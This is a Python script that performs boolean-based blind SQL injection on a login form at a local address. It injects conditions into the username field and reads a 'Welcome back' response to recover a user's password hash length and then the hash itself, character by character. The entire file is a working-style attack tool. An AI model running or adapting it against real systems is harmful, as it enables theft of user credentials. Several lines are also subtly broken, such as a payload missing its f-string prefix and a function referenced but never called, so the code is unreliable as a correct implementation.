import requests

total_queries = 0
charset = "0123456789abcdef"
target = "127.0.0.1:5000"
needle = "Welcome back"

def injected_query(payload): #inject payloads into vulnerable target. payloads given by subsequent functions. return True if needle is not in the response (which means the vuln/error is still present)
  global total_queries
  r = requests.post(target, data = {"username" : f"admin' and {payload}--", "password" : "password"})
  total_queries += 1
  return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"): #determine hash's correct characters
  payload = f"(select hex(substr(password,{offset+1},1)) from user where id = {user_id}) {operator} hex('{character}')"
  return injected_query(payload)

def invalid_user(user_id): #validate user id
  payload = f"(select id from user where id = {user_id}) >= 0"
  return injected_query(payload)

def password_length(user_id): #find pass length
  i = 0
  while True:
    payload = "(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
    if not injected_query(payload): # if the needle is present in the response, return the found (correct) password length value. else, increment and repeat
      return i
    i += 1

def extract_hash(charset, user_id, password_length): #find pass hash
  found = ""
  for i in range(0, password_length):
    for j in range(len(charset)):
      if boolean_query(i, user_id, charset[j]): #iterate through boolean query using i+1 as the offset value and j as the value of the index at charset
        found += charset[j] #if a valid character is found, append it to the 'found' variable
        break
  return found

def total_queries_taken(): #display total queries for logging and debugging
  global total_queries
  print(f"\t\t[!] Total Queries: {total_queries}")
  total_queries = 0

while True: #main implementation
  try:
    user_id = input("Enter User ID to extract hash: ")
    if not invalid_user(user_id):
      user_password_length = password_length(user_id)
      print(f"\t[-] User: {user_id} Hash Length: {user_password_length}")
      total_queries_taken()
      print(f"\t[-] User: {user_id} Hash: {extract_hash(charset, int(user_id), user_password_length)}")
      total_queries_taken
    else:
      print(f"\t[X] User {user_id} does not exist")
  except KeyboardInterrupt:
    break